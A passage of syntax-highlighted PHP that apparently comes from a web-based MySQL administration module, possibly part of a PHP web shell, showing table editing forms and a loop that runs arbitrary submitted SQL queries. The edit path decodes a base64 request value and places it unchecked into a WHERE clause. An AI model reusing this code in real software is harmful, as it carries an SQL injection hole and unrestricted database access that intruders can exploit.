<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">p(</span><span style="color: #70c0b1;">'&lt;td&gt;'</span>.$<span style="color: #e7c547;">row</span>[<span style="color: #70c0b1;">'Comment'</span>].<span style="color: #70c0b1;">'&amp;nbsp;&lt;/td&gt;'</span>);
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">p(</span><span style="color: #70c0b1;">'&lt;/tr&gt;'</span>);
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   }
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">tbfoot(</span>);
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   } <span style="color: #b9ca4a;">elseif</span> ($<span style="color: #e7c547;">doing</span> == <span style="color: #70c0b1;">'insert'</span> || $<span style="color: #e7c547;">doing</span> == <span style="color: #70c0b1;">'edit'</span>) {
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">result</span> = <span style="color: #eaeaea; background-color: #000000;">q(</span><span style="color: #70c0b1;">'SHOW COLUMNS FROM '</span>.$<span style="color: #e7c547;">tablename</span>);
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">while</span> ($<span style="color: #e7c547;">row</span> = <span style="color: #eaeaea; background-color: #000000;">mysql_fetch_array(</span>$<span style="color: #e7c547;">result</span>)) {
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">rowdb</span>[] = $<span style="color: #e7c547;">row</span>;
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   }
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">rs</span> = <span style="color: #eaeaea; background-color: #000000;">array(</span>);
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">if</span> ($<span style="color: #e7c547;">doing</span> == <span style="color: #70c0b1;">'insert'</span>) {
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">p(</span><span style="color: #70c0b1;">'&lt;h2&gt;Insert new line in '</span>.$<span style="color: #e7c547;">tablename</span>.<span style="color: #70c0b1;">' table &amp;raquo;&lt;/</span><span style="color: #70c0b1; text-decoration: underline;">h2&gt;'</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   } <span style="color: #b9ca4a;">else</span> {
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">p(</span><span style="color: #70c0b1;">'&lt;h2&gt;Update record in '</span>.$<span style="color: #e7c547;">tablename</span>.<span style="color: #70c0b1;">' table &amp;raquo;&lt;/h2</span><span style="color: #70c0b1; text-decoration: underline;">&gt;'</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">where</span> = <span style="color: #eaeaea; background-color: #000000;">base64_decode(</span>$<span style="color: #e7c547;">base64</span>);
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">result</span> = <span style="color: #eaeaea; background-color: #000000;">q(</span><span style="color: #70c0b1;">"SELECT * FROM $tablename WHERE $where LIMIT</span><span style="color: #70c0b1; text-decoration: underline;"> 1"</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">rs</span> = <span style="color: #eaeaea; background-color: #000000;">mysql_fetch_array(</span>$<span style="color: #e7c547;">result</span>);
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   }
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">p(</span><span style="color: #70c0b1;">'&lt;form method="post" action="'</span>.$<span style="color: #e7c547;">self</span>.<span style="color: #70c0b1;">'"&gt;'</span>);
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">p(</span>$<span style="color: #e7c547;">dbform</span>);
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">makehide(</span><span style="color: #70c0b1;">'action'</span>,<span style="color: #70c0b1;">'mysqladmin'</span>);
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">makehide(</span><span style="color: #70c0b1;">'tablename'</span>,$<span style="color: #e7c547;">tablename</span>);
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">p(</span><span style="color: #70c0b1;">'&lt;table border="0" cellpadding="3" cellspacing="0"&gt;'</span>);
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">foreach</span> ($<span style="color: #e7c547;">rowdb</span> <span style="color: #b9ca4a;">as</span> $<span style="color: #e7c547;">row</span>) {
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">if</span> ($<span style="color: #e7c547;">rs</span>[$<span style="color: #e7c547;">row</span>[<span style="color: #70c0b1;">'Field'</span>]]) {
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">value</span> = <span style="color: #eaeaea; background-color: #000000;">htmlspecialchars(</span>$<span style="color: #e7c547;">rs</span>[$<span style="color: #e7c547;">row</span>[<span style="color: #70c0b1;">'Field'</span>]]);
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   } <span style="color: #b9ca4a;">else</span> {
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">value</span> = <span style="color: #70c0b1;">''</span>;
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   }
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">thisbg</span> = <span style="color: #eaeaea; background-color: #000000;">bg(</span>);
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">p(</span><span style="color: #70c0b1;">'&lt;tr class="'</span>.$<span style="color: #e7c547;">thisbg</span>.<span style="color: #70c0b1;">'" onmouseover="this.className=\</span><span style="color: #70c0b1; text-decoration: underline;">'focus\';" onmouseout="this.className=\''</span><span style="text-decoration: underline;">.$</span><span style="color: #e7c547; text-decoration: underline;">thisbg</span><span style="text-decoration: underline;">.</span><span style="color: #70c0b1; text-decoration: underline;">'\';"&gt;'</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">if</span> ($<span style="color: #e7c547;">row</span>[<span style="color: #70c0b1;">'Key'</span>] == <span style="color: #70c0b1;">'UNI'</span> || $<span style="color: #e7c547;">row</span>[<span style="color: #70c0b1;">'Extra'</span>] == <span style="color: #70c0b1;">'auto_incre</span><span style="color: #70c0b1; text-decoration: underline;">ment'</span><span style="text-decoration: underline;"> || $</span><span style="color: #e7c547; text-decoration: underline;">row</span><span style="text-decoration: underline;">[</span><span style="color: #70c0b1; text-decoration: underline;">'Key'</span><span style="text-decoration: underline;">] == </span><span style="color: #70c0b1; text-decoration: underline;">'PRI'</span><span style="text-decoration: underline;">) {</span>
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">p(</span><span style="color: #70c0b1;">'&lt;td&gt;&lt;b&gt;'</span>.$<span style="color: #e7c547;">row</span>[<span style="color: #70c0b1;">'Field'</span>].<span style="color: #70c0b1;">'&lt;/b&gt;&lt;br /&gt;'</span>.$<span style="color: #e7c547;">row</span>[<span style="color: #70c0b1;">'Type'</span>].<span style="color: #70c0b1; text-decoration: underline;">'&lt;/td&gt;&lt;td&gt;'</span><span style="text-decoration: underline;">.$</span><span style="color: #e7c547; text-decoration: underline;">value</span><span style="text-decoration: underline;">.</span><span style="color: #70c0b1; text-decoration: underline;">'&amp;nbsp;&lt;/td&gt;&lt;/tr&gt;'</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   } <span style="color: #b9ca4a;">else</span> {<span style="color: #d54e53; background-color: #424242;">                            </span>
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">p(</span><span style="color: #70c0b1;">'&lt;td&gt;&lt;b&gt;'</span>.$<span style="color: #e7c547;">row</span>[<span style="color: #70c0b1;">'Field'</span>].<span style="color: #70c0b1;">'&lt;/b&gt;&lt;br /&gt;'</span>.$<span style="color: #e7c547;">row</span>[<span style="color: #70c0b1;">'Type'</span>].<span style="color: #70c0b1; text-decoration: underline;">'&lt;/td&gt;&lt;td&gt;&lt;textarea class="area" name="insertsql['</span><span style="text-decoration: underline;">.$</span><span style="color: #e7c547; text-decoration: underline;">row</span><span style="text-decoration: underline;">[</span><span style="color: #70c0b1; text-decoration: underline;">'Field'</span><span style="text-decoration: underline;">].</span><span style="color: #70c0b1; text-decoration: underline;">']" style="width:500px;height:60px;overflow:auto;"&gt;'</span><span style="text-decoration: underline;">.$</span><span style="color: #e7c547; text-decoration: underline;">value</span><span style="text-decoration: underline;">.</span><span style="color: #70c0b1; text-decoration: underline;">'&lt;/textarea&gt;&lt;/td&gt;&lt;/tr&gt;'</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   }
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   }
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">if</span> ($<span style="color: #e7c547;">doing</span> == <span style="color: #70c0b1;">'insert'</span>) {
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">p(</span><span style="color: #70c0b1;">'&lt;tr class="'</span>.<span style="color: #eaeaea; background-color: #000000;">bg(</span>).<span style="color: #70c0b1;">'"&gt;&lt;td colspan="2"&gt;&lt;input class="bt</span><span style="color: #70c0b1; text-decoration: underline;">" type="submit" name="insert" value="Insert" /&gt;&lt;/td&gt;&lt;/tr&gt;'</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   } <span style="color: #b9ca4a;">else</span> {
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">p(</span><span style="color: #70c0b1;">'&lt;tr class="'</span>.<span style="color: #eaeaea; background-color: #000000;">bg(</span>).<span style="color: #70c0b1;">'"&gt;&lt;td colspan="2"&gt;&lt;input class="bt</span><span style="color: #70c0b1; text-decoration: underline;">" type="submit" name="update" value="Update" /&gt;&lt;/td&gt;&lt;/tr&gt;'</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">makehide(</span><span style="color: #70c0b1;">'base64'</span>, $<span style="color: #e7c547;">base64</span>);
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   }
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">p(</span><span style="color: #70c0b1;">'&lt;/table&gt;&lt;/form&gt;'</span>);
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   } <span style="color: #b9ca4a;">else</span> {
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">querys</span> = @<span style="color: #eaeaea; background-color: #000000;">explode(</span><span style="color: #70c0b1;">';'</span>,$<span style="color: #e7c547;">sql_query</span>);
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">foreach</span>($<span style="color: #e7c547;">querys</span> <span style="color: #b9ca4a;">as</span> $<span style="color: #e7c547;">num</span>=&gt;$<span style="color: #e7c547;">query</span>) {
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">if</span> ($<span style="color: #e7c547;">query</span>) {
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">p(</span><span style="color: #70c0b1;">"&lt;p&gt;&lt;b&gt;Query#{$num} : "</span>.<span style="color: #eaeaea; background-color: #000000;">htmlspecialchars(</span>$<span style="color: #e7c547;">query</span>,<span style="color: #7aa6da;">EN</span><span style="color: #7aa6da; text-decoration: underline;">T_QUOTES</span><span style="text-decoration: underline;">).</span><span style="color: #70c0b1; text-decoration: underline;">"&lt;/b&gt;&lt;/p&gt;"</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">switch</span>(<span style="color: #eaeaea; background-color: #000000;">qy(</span>$<span style="color: #e7c547;">query</span>))
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   {
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">case</span> <span style="color: #7aa6da;">0</span>:
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">p(</span><span style="color: #70c0b1;">'&lt;h2&gt;Error : '</span>.<span style="color: #eaeaea; background-color: #000000;">mysql_error(</span>).<span style="color: #70c0b1;">'&lt;/h2&gt;'</span>);
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">break</span>;<span style="color: #d54e53; background-color: #424242;">  </span>
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">case</span> <span style="color: #7aa6da;">1</span>:
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">if</span> (<span style="color: #eaeaea; background-color: #000000;">strtolower(substr(</span>$<span style="color: #e7c547;">query</span>,<span style="color: #eaeaea; background-color: #000000;">0</span>,<span style="color: #eaeaea; background-color: #000000;">13</span>)) == <span style="color: #70c0b1;">'sele</span><span style="color: #70c0b1; text-decoration: underline;">ct * from'</span><span style="text-decoration: underline;">) {</span>
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">allowedit</span> = <span style="color: #eaeaea; background-color: #000000;">1</span>;
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   }
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">if</span> ($<span style="color: #e7c547;">getnumsql</span>) {
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">tatol</span> = <span style="color: #eaeaea; background-color: #000000;">mysql_num_rows(q(</span>$<span style="color: #e7c547;">getnumsql</span>));
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">multipage</span> = <span style="color: #eaeaea; background-color: #000000;">multi(</span>$<span style="color: #e7c547;">tatol</span>, $<span style="color: #e7c547;">pagenum</span>, $<span style="color: #e7c547;">pa</span><span style="color: #e7c547; text-decoration: underline;">ge</span><span style="text-decoration: underline;">, $</span><span style="color: #e7c547; text-decoration: underline;">tablename</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   }
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">if</span> (!$<span style="color: #e7c547;">tablename</span>) {
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">sql_line</span> = <span style="color: #eaeaea; background-color: #000000;">str_replace(array(</span><span style="color: #70c0b1;">"\r"</span>, <span style="color: #70c0b1;">"\n"</span><span style="text-decoration: underline;">, </span><span style="color: #70c0b1; text-decoration: underline;">"\t"</span><span style="text-decoration: underline;">), </span><span style="color: #eaeaea; background-color: #000000; text-decoration: underline;">array(</span><span style="color: #70c0b1; text-decoration: underline;">' '</span><span style="text-decoration: underline;">, </span><span style="color: #70c0b1; text-decoration: underline;">' '</span><span style="text-decoration: underline;">, </span><span style="color: #70c0b1; text-decoration: underline;">' '</span><span style="text-decoration: underline;">), </span><span style="color: #eaeaea; background-color: #000000; text-decoration: underline;">trim(htmlspecialchars(</span><span style="text-decoration: underline;">$</span><span style="color: #e7c547; text-decoration: underline;">query</span><span style="text-decoration: underline;">)));</span>
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">sql_line</span> = <span style="color: #eaeaea; background-color: #000000;">preg_replace(</span><span style="color: #70c0b1;">"/\/\*[^(\*\/)]</span><span style="color: #70c0b1; text-decoration: underline;">*\*\//i"</span><span style="text-decoration: underline;">, </span><span style="color: #70c0b1; text-decoration: underline;">" "</span><span style="text-decoration: underline;">, $</span><span style="color: #e7c547; text-decoration: underline;">sql_line</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">preg_match_all(</span><span style="color: #70c0b1;">"/from\s+`{0,1}([\w]+)`{0</span><span style="color: #70c0b1; text-decoration: underline;">,1}\s+/i"</span><span style="text-decoration: underline;">,$</span><span style="color: #e7c547; text-decoration: underline;">sql_line</span><span style="text-decoration: underline;">,$</span><span style="color: #e7c547; text-decoration: underline;">matches</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">tablename</span> = $<span style="color: #e7c547;">matches</span>[<span style="color: #eaeaea; background-color: #000000;">1</span>][<span style="color: #eaeaea; background-color: #000000;">0</span>];
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   }

<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #969896; font-style: italic;">/*********************</span><span style="color: #969896; font-style: italic;">/</span>
